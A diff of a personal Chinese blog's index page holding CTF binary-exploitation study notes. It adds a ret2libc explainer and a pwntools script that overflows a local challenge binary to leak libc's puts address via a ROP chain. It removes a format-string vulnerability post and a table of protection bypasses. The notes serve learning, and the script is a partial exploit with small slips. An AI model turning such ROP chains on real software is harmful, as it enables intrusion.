@@ -136,7 +136,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">11</span>
+          <span class="site-state-item-count">13</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -162,6 +162,168 @@
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://yourdomain.com/2026/05/07/re2libc/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="林夏">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="林夏的博客">
+      <meta itemprop="description" content="个人博客，记录技术、生活和思考">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | 林夏的博客">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2026/05/07/re2libc/" class="post-title-link" itemprop="url">re2libc</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2026-05-07 20:00:00 / 修改时间：20:54:45" itemprop="dateCreated datePublished" datetime="2026-05-07T20:00:00+08:00">2026-05-07</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6/" itemprop="url" rel="index"><span itemprop="name">技术研究</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="re2libc"><a href="#re2libc" class="headerlink" title="re2libc"></a>re2libc</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>  ret2libc这种攻击方式主要是针对动态链接(Dynamic linking)编译的程序，因为正常情况下是无法在程序中找到像system()、 execve()这种系统级函数（如果程序中直接包含了这种函数就可以直接控制返回地址指向他们，而不用通过这种麻烦的方式。</p>
+<h2 id="使用原因"><a href="#使用原因" class="headerlink" title="使用原因"></a>使用原因</h2><p>  现代操作系统为了增加系统的安全性,采取了ASLR和NX等安全措施，以防止恶意代码的注入和执行。通过retzlibc攻击，攻击者可以利用己加载到内存中的标准c库函数从而完成对系统的攻击。</p>
+<h2 id="动态链接"><a href="#动态链接" class="headerlink" title="动态链接"></a>动态链接</h2><p>  动态链接是指在程序装载时通过动态链接器将程序所需的所有动态链接 Dynamic linking library)装载至进程空间中(程序按照模块拆分成各个相对独立的部分)，    当程序运行时才将他们链接在一一起形成一个完整程序的过程。<br>  动态链接的优点：1.节约内存；2，共享库文件；3，灵活更新；4，减小可执行文件大小；</p>
+<h2 id="got表和plt表"><a href="#got表和plt表" class="headerlink" title="got表和plt表"></a>got表和plt表</h2><p> 就是利用某个可打印东西的函数，打印出另一个函数在Go表中的地址,GOT(Global Offset Table,全局偏移表)是Linux ELF文件中用于定位全局变量和函数的一个表。PLT(Procedure Linkage Table,过程链接表)是Linux ELF文件中用于延迟绑定的表。</p>
+<h2 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a>延迟绑定</h2><p> 所谓延迟绑定，就是当函数第一次被调用的时候才进行绑定（包括符号查找、重定位等）,如果函数从来没有用到过就不进行绑定。基于延迟绑定可以大大加快程序的启动速度，特别有利于-一些引用了大量函数的程序。</p>
+<h2 id="计算libc基址-固定公式"><a href="#计算libc基址-固定公式" class="headerlink" title="计算libc基址(固定公式)"></a>计算libc基址(固定公式)</h2><p>  函数在libc中的偏移地址可以用python pwntools中的函数libc. symbols[‘puts]函数进行计算<br> libc基地址  &#x3D;函数实际地址-函数在libc库中的偏移地址<br> system_addr &#x3D; libc基地址    + system在I ibc库中的偏移地址<br>  puts_addr  &#x3D; libc基地址    +puts在libc库中的偏移地址</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://yourdomain.com/2026/05/07/nss/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="林夏">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="林夏的博客">
+      <meta itemprop="description" content="个人博客，记录技术、生活和思考">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | 林夏的博客">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2026/05/07/nss/" class="post-title-link" itemprop="url">nssctf</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2026-05-07 20:00:00 / 修改时间：20:40:28" itemprop="dateCreated datePublished" datetime="2026-05-07T20:00:00+08:00">2026-05-07</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6/" itemprop="url" rel="index"><span itemprop="name">技术研究</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -480,7 +642,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2026-04-25 19:42:59" itemprop="dateModified" datetime="2026-04-25T19:42:59+08:00">2026-04-25</time>
+      <time title="修改时间：2026-05-05 11:20:40" itemprop="dateModified" datetime="2026-05-05T11:20:40+08:00">2026-05-05</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -505,7 +667,7 @@
           <span id="more"></span>
 <h2 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h2><p>chmod +x WebSocketReflectorX-0.5.17-linux-gnu-x86_64.AppImage<br>.&#x2F;WebSocketReflectorX-0.5.17-linux-gnu-x86_64.AppImage</p>
 <p>hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</p>
-<p>ROPgadget –binary .&#x2F;pwn1 | grep “ret”</p>
+<p>ROPgadget –binary .&#x2F;pwn1 | grep “ret”<br>from pwn import *<br>context(arch&#x3D;’amd64’, os&#x3D;’linux’, log_level&#x3D;’debug’)<br>r &#x3D; process(‘cc1’)<br>elf &#x3D; ELF(‘.&#x2F;cc1’)<br>pop_rdi_offset &#x3D; 0x400c83<br>puts_plt_offset &#x3D; elf.plt[‘puts’]<br>puts_got_offset &#x3D; elf.got[‘puts’]<br>main_offset &#x3D; 0x400B28<br>padding &#x3D; 88<br>payload &#x3D; b’a’*padding<br>payload +&#x3D; p64(pop_rdi_offset)<br>payload +&#x3D; p64(puts_got_offset)<br>payload +&#x3D; p64(puts_plt_offset)<br>payload +&#x3D; p64(main_offset)<br>r.sendlineafter(b’Input your choice!’, b’1’)<br>r.sendline(payload)<br>r.recvuntil(b’Ciphertext\n’)<br>leak &#x3D; u64(r.recvline().strip().ljust(8,b’\x00’))<br>puts_addr &#x3D; u64(leak)<br>print(f”leaked puts: {hex(puts_addr)}”)<br>r.interactive()</p>
 
       
     </div>
@@ -568,7 +730,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2026-04-21 17:52:23" itemprop="dateModified" datetime="2026-04-21T17:52:23+08:00">2026-04-21</time>
+      <time title="修改时间：2026-05-05 11:20:40" itemprop="dateModified" datetime="2026-05-05T11:20:40+08:00">2026-05-05</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -1039,239 +1201,6 @@ readelf -S ./pwn | grep relro
 # 5. 查看系统 ASLR 级别
 cat /proc/sys/kernel/randomize_va_space
 </code></pre>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://yourdomain.com/2026/04/13/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="林夏">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="林夏的博客">
-      <meta itemprop="description" content="个人博客，记录技术、生活和思考">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | 林夏的博客">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2026/04/13/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" class="post-title-link" itemprop="url">格式化字符串漏洞详解（原理与利用）</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2026-04-13 20:00:00" itemprop="dateCreated datePublished" datetime="2026-04-13T20:00:00+08:00">2026-04-13</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2026-04-20 20:14:54" itemprop="dateModified" datetime="2026-04-20T20:14:54+08:00">2026-04-20</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6/" itemprop="url" rel="index"><span itemprop="name">技术研究</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h1><h2 id="（一）格式化字符串-Format-String"><a href="#（一）格式化字符串-Format-String" class="headerlink" title="（一）格式化字符串 (Format String)"></a>（一）格式化字符串 (Format String)</h2><p>格式化字符串是一种包含<strong>普通文本</strong>和<strong>格式说明符</strong>的字符串，用于指导输出函数（如 C 语言中的 <code>printf</code> 系列函数）如何格式化和显示数据。</p>
-<p>格式化字符串由两部分组成：</p>
-<ol>
-<li><strong>普通字符</strong>：直接输出到结果中的字符，原样显示。</li>
-<li><strong>格式说明符</strong>：以百分号 <code>%</code> 开始，后面跟着一个或多个字符，用于指定<strong>数据类型</strong>和<strong>输出格式</strong>。<ul>
-<li>例如：<code>%d</code> (整数), <code>%s</code> (字符串), <code>%x</code> (十六进制), <code>%p</code> (地址)。</li>
-</ul>
-</li>
-</ol>
-<hr>
-<h2 id="（二）格式化字符串漏洞-Format-String-Vulnerability"><a href="#（二）格式化字符串漏洞-Format-String-Vulnerability" class="headerlink" title="（二）格式化字符串漏洞 (Format String Vulnerability)"></a>（二）格式化字符串漏洞 (Format String Vulnerability)</h2><h3 id="1-漏洞定义"><a href="#1-漏洞定义" class="headerlink" title="1. 漏洞定义"></a>1. 漏洞定义</h3><p>格式化字符串漏洞是一种<strong>高风险安全漏洞</strong>，通常发生在程序使用格式化字符串函数时，如 C 语言中的：</p>
-<ul>
-<li><code>printf()</code></li>
-<li><code>sprintf()</code></li>
-<li><code>fprintf()</code></li>
-<li><code>syslog()</code></li>
-</ul>
-<h3 id="2-漏洞本质"><a href="#2-漏洞本质" class="headerlink" title="2. 漏洞本质"></a>2. 漏洞本质</h3><p>这种漏洞的根本问题在于：<strong>程序将“用户可控的输入”直接当作格式化字符串（Format String）传递给了输出函数</strong>。</p>
-<p>正常情况下，我们应该这样写：</p>
-<pre><code class="language-c">// ✅ 安全写法：%s 是占位符，用户输入作为参数传入
-char input[100];
-scanf(&quot;%s&quot;, input);
-printf(&quot;User input: %s\n&quot;, input);
-// ❌ 危险写法：直接把用户输入当作格式化字符串处理
-char input[100];
-scanf(&quot;%s&quot;, input);
-printf(input); // 如果用户输入了 &quot;%x%x%s&quot;，程序就会暴露内存！
-</code></pre>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://yourdomain.com/2025/11/22/%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E5%88%9D%E7%BA%A7/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="林夏">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="林夏的博客">
-      <meta itemprop="description" content="个人博客，记录技术、生活和思考">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | 林夏的博客">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2025/11/22/%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E5%88%9D%E7%BA%A7/" class="post-title-link" itemprop="url">未命名</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2025-11-22 20:40:13" itemprop="dateCreated datePublished" datetime="2025-11-22T20:40:13+08:00">2025-11-22</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2026-04-16 20:09:12" itemprop="dateModified" datetime="2026-04-16T20:09:12+08:00">2026-04-16</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <hr>
-<p>title: 格式化字符串漏洞详解（原理与利用）</p>
-<details>
-<summary>📖 点击展开全文</summary>
-
-<p>## 一、保护机制总览</p>
-<h1 id="🛡️-常见保护机制"><a href="#🛡️-常见保护机制" class="headerlink" title="🛡️ 常见保护机制"></a>🛡️ 常见保护机制</h1><table>
-<thead>
-<tr>
-<th>保护</th>
-<th>作用</th>
-<th>影响</th>
-<th>绕过</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>NX</td>
-<td>栈不可执行</td>
-<td>❌ shellcode</td>
-<td>ret2libc &#x2F; ROP</td>
-</tr>
-<tr>
-<td>Canary</td>
-<td>栈保护</td>
-<td>❌ 覆盖返回地址会崩溃</td>
-<td>leak</td>
-</tr>
-<tr>
-<td>PIE</td>
-<td>程序地址随机</td>
-<td>❌ 地址不固定</td>
-<td>leak</td>
-</tr>
-<tr>
-<td>ASLR</td>
-<td>内存地址随机</td>
-<td>❌ libc&#x2F;栈地址变化</td>
-<td>leak</td>
-</tr>
-<tr>
-<td>RELRO</td>
-<td>保护 GOT 表</td>
-<td>❌ Full 不可改 GOT</td>
-<td>ROP</td>
-</tr>
-</tbody></table>
 
       
     </div>
